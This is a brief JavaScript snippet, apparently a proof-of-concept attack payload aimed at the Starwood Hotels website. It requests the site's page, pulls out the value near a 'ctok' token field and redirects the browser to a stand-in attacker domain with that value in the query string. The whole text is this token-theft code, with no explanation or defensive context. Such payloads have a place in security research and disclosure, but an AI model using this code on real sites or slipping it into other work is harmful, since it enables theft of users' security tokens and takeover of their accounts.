var res = 'http://www.starwoodhotels.com/'; 
var req = new XMLHttpRequest(); 
req.onreadystatechange = function() { 
  console.log(req.readyState); 
  if(req.readyState==4 && req.status==200) 
    { var response = req.responseText;  
      alert(response); 
      var n = response.search('name="ctok"');  
      if(n > 0) 
        {  var risk = response.substring(n+1, n+30); 
           var win = 'http://www.evilattackerwebsite.com/%3Fc='+risk;  
           window.location = win; 
        } else { alert('not found');  } 
    } 
} 
req.open('GET',res, true); 
req.send();
